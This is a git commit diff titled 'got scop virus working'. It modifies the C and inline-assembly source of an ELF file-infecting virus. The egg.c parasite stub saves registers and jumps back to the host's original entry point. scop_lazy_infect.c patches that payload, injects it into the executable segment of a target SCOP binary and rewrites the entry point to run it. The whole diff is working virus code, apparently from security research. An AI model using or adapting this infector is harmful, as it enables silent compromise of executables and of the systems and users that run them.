0febd6ed9845a18d13716bd1b54f457b116e1cc5
elfmaster <ryan@bitlackeys.org>
2019-04-01 17:18:50 -0700

    got scop virus working

--- egg.c
+++ egg.c
@@ -13,12 +13,56 @@ static unsigned long vaddr_of_get_rip __attribute__((section(".data"))) = {0x00}
 unsigned long get_rip(void);
 
 extern long get_rip_label;
+extern long real_start;
 
+#define __ASM__ asm volatile
 /*
  * Code to jump back to entry point
  */
-int _start() {
+int volatile _start() {
+	/*
+	 * Save register state before executing parasite
+	 * code.
+	 */
+	__ASM__ (
+	".globl real_start\n"
+	 "real_start:	\n"
+	 "push %rsp	\n"
+	 "push %rbp	\n"
+	 "push %rax	\n"
+	 "push %rbx	\n"
+	 "push %rcx	\n"
+	 "push %rdx	\n"
+	 "push %r8	\n"
+	 "push %r9	\n"
+	 "push %r10	\n"
+	 "push %r11	\n"
+	 "push %r12	\n"
+	 "push %r13	\n"
+	 "push %r14	\n"
+	 "push %r15	  ");
+
 	unsigned long n_entry = get_rip() - (vaddr_of_get_rip - o_entry);
+
+	  /*
+	 * Restore register state
+	 */
+	__ASM__ (
+	 "pop %r15	\n"
+	 "pop %r14	\n"
+	 "pop %r13	\n"
+	 "pop %r12	\n"
+	 "pop %r11	\n"
+	 "pop %r10	\n"
+	 "pop %r9	\n"
+	 "pop %r8	\n"
+	 "pop %rdx	\n"
+	 "pop %rcx	\n"
+	 "pop %rbx	\n"
+	 "pop %rax	\n"
+	 "pop %rbp	\n"
+	 "pop %rsp	\n"
+	);
 
 	__asm__ volatile (
 		"movq %0, %%rbx\n"
@@ -28,16 +72,15 @@ int _start() {
 
 unsigned long get_rip(void)
 {
-        long ret;
-        __asm__ __volatile__
-        (
-        "call get_rip_label     \n"
-        ".globl get_rip_label   \n"
-        "get_rip_label:         \n"
-        "pop %%rax              \n"
-        "mov %%rax, %0" : "=r"(ret)
-        );
+	long ret;
+	__asm__ __volatile__
+	(
+	"call get_rip_label	\n"
+	".globl get_rip_label	\n"
+	"get_rip_label:		\n"
+	"pop %%rax		\n"
+	"mov %%rax, %0" : "=r"(ret)
+	);
 
-        return ret;
+	return ret;
 }
-
--- scop_lazy_infect.c
+++ scop_lazy_infect.c
@@ -22,19 +22,15 @@
 size_t code_len = 0;
 static uint8_t *code = NULL;
 
-/*
- * The first code we inject starts at get_rip() within stub.c
- * so injection_vaddr points to the offset within the target binary
- * that get_rip gets injected at.
- */
 bool
 patch_payload(const char *path, elfobj_t *target, elfobj_t *egg,
     uint64_t injection_vaddr)
 {
 	elf_error_t error;
-	struct elf_symbol get_rip_symbol, symbol;
+	struct elf_symbol get_rip_symbol, symbol, real_start_symbol;
 	struct elf_section section;
 	uint8_t *ptr;
+	size_t delta;
 
 	if (elf_open_object(path, egg,
 	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error) == false) {
@@ -46,14 +42,19 @@ patch_payload(const char *path, elfobj_t *target, elfobj_t *egg,
 		fprintf(stderr, "elf_symbol_by_name(\"get_rip\", ...)\n");
 		return false;
 	}
+	if (elf_symbol_by_name(egg, "_start", &real_start_symbol) == false) {
+		fprintf(stderr, "elf_symbol_by_name(\"real_start\", ...)\n");
+		return false;
+	}
+
+	delta = get_rip_symbol.value - real_start_symbol.value;
+	injection_vaddr += delta;
 
 	elf_symbol_by_name(egg, "vaddr_of_get_rip", &symbol);
 	ptr = elf_address_pointer(egg, symbol.value);
-	printf("Setting egg:vaddr_of_rip to %#lx\n", injection_vaddr);
 	*(uint64_t *)&ptr[0] = injection_vaddr;
 	elf_symbol_by_name(egg, "o_entry", &symbol);
 	ptr = elf_address_pointer(egg, symbol.value);
-	printf("Setting egg:o_entry to: %#lx\n", elf_entry_point(target));
 	*(uint64_t *)&ptr[0] = elf_entry_point(target);
 
 	return true;
@@ -73,7 +74,7 @@ int main(int argc, char **argv)
 	elf_section_iterator_t s_iter;
 	struct elf_section s_entry;
 	struct elf_symbol symbol;
-	uint64_t get_rip_offset;
+	uint64_t egg_start_offset;
 	elfobj_t eggobj;
 	uint8_t *eggptr;
 	size_t eggsiz;
@@ -82,7 +83,6 @@ int main(int argc, char **argv)
 		printf("Usage: %s <SCOP_ELF_BINARY>\n", argv[0]);
 		exit(EXIT_SUCCESS);
 	}
-
 	if (elf_open_object(argv[1], &elfobj,
 	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error) == false) {
 		fprintf(stderr, "elf_open_object(): %s\n", elf_error_msg(&error));
@@ -92,23 +92,6 @@ int main(int argc, char **argv)
 		fprintf(stderr, "%s is not a SCOP binary\n", elf_pathname(&elfobj));
 		exit(EXIT_SUCCESS);
 	}
-	/*
-	 * Patch ./egg so that its two global variables 'uint64_t o_entry'
-	 * and 'uint64_t vaddr_of_get_rip' are set to the original entry
-	 * point of the target executable, and the address of where within
-	 * that executable the get_rip() function will be injected.
-	 */
-	if (patch_payload("./egg", &elfobj, &eggobj,
-	    text_offset + o_filesz) == false) {
-		fprintf(stderr, "Failed to patch payload \"./egg\"\n");
-		goto done;
-	}
-
-	elf_symbol_by_name(&eggobj, "get_rip", &symbol);
-	get_rip_offset = symbol.value - elf_text_base(&eggobj);
-	eggptr = elf_offset_pointer(&eggobj, get_rip_offset); 
-	eggsiz = elf_size(&eggobj) - get_rip_offset;
-
 	elf_segment_iterator_init(&elfobj, &p_iter);
 	while (elf_segment_iterator_next(&p_iter, &segment) == ELF_ITER_OK) {
 		if (segment.type == PT_LOAD && segment.flags == (PF_R|PF_X)) {
@@ -128,6 +111,30 @@ int main(int argc, char **argv)
 			break;
 		}
 	}
+	/*
+	 * Patch ./egg so that its two global variables 'uint64_t o_entry'
+	 * and 'uint64_t vaddr_of_get_rip' are set to the original entry
+	 * point of the target executable, and the address of where within
+	 * that executable the get_rip() function will be injected.
+	 */
+	if (patch_payload("./egg", &elfobj, &eggobj,
+	    text_offset + o_filesz) == false) {
+		fprintf(stderr, "Failed to patch payload \"./egg\"\n");
+		goto done;
+	}
+
+	/*
+	 * NOTE We must use PAGE_ALIGN on elf_text_base() because it's PT_LOAD
+	 * is a merged text and data segment, which results in having a p_offset
+	 * larger than 0, even though the initial ELF file header actually starts
+	 * at offset 0. Check out 'gcc -N -nostdlib -static code.c -o code' and
+	 * examine phdr's etc. to understand what I mean.
+	 */
+	elf_symbol_by_name(&eggobj, "_start", &symbol);
+	egg_start_offset = symbol.value - PAGE_ALIGN(elf_text_base(&eggobj));
+	eggptr = elf_offset_pointer(&eggobj, egg_start_offset);
+	eggsiz = elf_size(&eggobj) - egg_start_offset;
+
 	switch(elf_class(&elfobj)) {
 	case elfclass32:
 		elfobj.ehdr32->e_entry = text_vaddr + o_filesz;
